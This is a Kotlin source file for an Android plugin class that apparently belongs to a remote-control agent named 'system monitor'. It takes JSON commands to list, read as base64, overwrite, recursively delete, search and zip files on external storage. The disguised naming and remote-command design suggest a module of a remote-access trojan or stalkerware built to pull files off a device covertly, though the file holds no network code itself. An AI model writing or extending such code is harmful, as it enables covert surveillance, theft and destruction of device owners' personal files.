package com.system.monitor.capabilities

import android.os.Environment
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.io.File
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class FilesCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "list" -> listDir(params.path ?: Environment.getExternalStorageDirectory().absolutePath)
            "read" -> readFile(params.path!!)
            "write" -> writeFile(params.path!!, params.content!!)
            "delete" -> deleteFile(params.path!!)
            "download" -> downloadFile(params.path!!)
            "search" -> searchFiles(params.path ?: Environment.getExternalStorageDirectory().absolutePath, params.pattern!!)
            "zip" -> zipDir(params.path!!, params.dest!!)
            else -> mapOf("error" to "invalid action")
        }
    }

    private fun listDir(path: String): Map<String, Any> {
        val file = File(path)
        return if (file.exists() && file.isDirectory) {
            val entries = file.listFiles()?.map { f ->
                mapOf("name" to f.name, "path" to f.absolutePath, "size" to f.length(), "is_dir" to f.isDirectory, "mod_time" to f.lastModified())
            } ?: emptyList()
            mapOf("entries" to entries)
        } else mapOf("error" to "not a directory")
    }

    private fun readFile(path: String): Map<String, Any> {
        return try {
            mapOf("content" to android.util.Base64.encodeToString(File(path).readBytes(), android.util.Base64.NO_WRAP))
        } catch (e: Exception) { mapOf("error" to e.message) }
    }

    private fun writeFile(path: String, contentB64: String): Map<String, Any> {
        return try {
            File(path).writeBytes(android.util.Base64.decode(contentB64, android.util.Base64.NO_WRAP))
            mapOf("status" to "written")
        } catch (e: Exception) { mapOf("error" to e.message) }
    }

    private fun deleteFile(path: String): Map<String, Any> {
        return try { File(path).deleteRecursively(); mapOf("status" to "deleted") } catch (e: Exception) { mapOf("error" to e.message) }
    }

    private fun downloadFile(path: String): Map<String, Any> = readFile(path)

    private fun searchFiles(root: String, pattern: String): Map<String, Any> {
        val matches = mutableListOf<String>()
        File(root).walk().filter { it.name.matches(pattern.toRegex()) }.forEach { matches.add(it.absolutePath) }
        return mapOf("matches" to matches)
    }

    private fun zipDir(src: String, dest: String): Map<String, Any> {
        return try {
            ZipOutputStream(File(dest).outputStream()).use { zos ->
                File(src).walk().filter { it.isFile }.forEach { file ->
                    zos.putNextEntry(ZipEntry(file.absolutePath.substringAfter(src + "/")))
                    zos.write(file.readBytes())
                    zos.closeEntry()
                }
            }
            mapOf("status" to "zipped", "path" to dest)
        } catch (e: Exception) { mapOf("error" to e.message) }
    }

    override fun cleanup() {}

    data class Params(val action: String, val path: String? = null, val content: String? = null, val dest: String? = null, val pattern: String? = null, val recursive: Boolean = false)
}